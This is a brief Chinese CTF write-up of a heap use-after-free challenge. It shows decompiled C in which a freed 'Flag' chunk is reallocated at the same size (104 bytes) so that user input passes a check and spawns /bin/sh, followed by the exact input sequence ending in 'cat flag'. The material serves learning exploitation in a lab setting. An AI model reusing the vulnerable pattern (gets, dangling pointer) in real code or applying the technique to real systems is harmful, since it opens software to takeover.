---
title: uaf
published: 2026-03-19
description: "一些Uaf的题目"
tags: ["ctfwp", "heap"]
category: ctf
draft: false
---

将程序拖入 ida 发现如下重要代码
```c
int __cdecl Are()
{
  int result; // eax
  int size; // [rsp+4h] [rbp-1Ch] BYREF
  char *Flag; // [rsp+8h] [rbp-18h]
  char *b; // [rsp+10h] [rbp-10h]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  Flag = (char *)malloc(0x68u);
  strcpy(Flag, "Flag");
  free(Flag);
  size = 0;
  puts("Please Input Chunk size :");
  __isoc99_scanf("%d", &size);
  getchar();
  b = (char *)malloc(size);
  puts("Please Input Content : ");
  gets(b);
  result = strncmp(Flag, "Flag", 4u);
  if ( !result )
    return system("/bin/sh");
  return result;
}
```

可以发现存在典型的Uaf漏洞， 指针Flag释放后没有被清空，如果在申请堆块的时候 b指向的内存大小为Flag相同大小那么就能够获得Flag的地址。使得Flag内容可控

所以依次这样操作就可以获取flag
```bash
5

104

Flag

cat flag
```
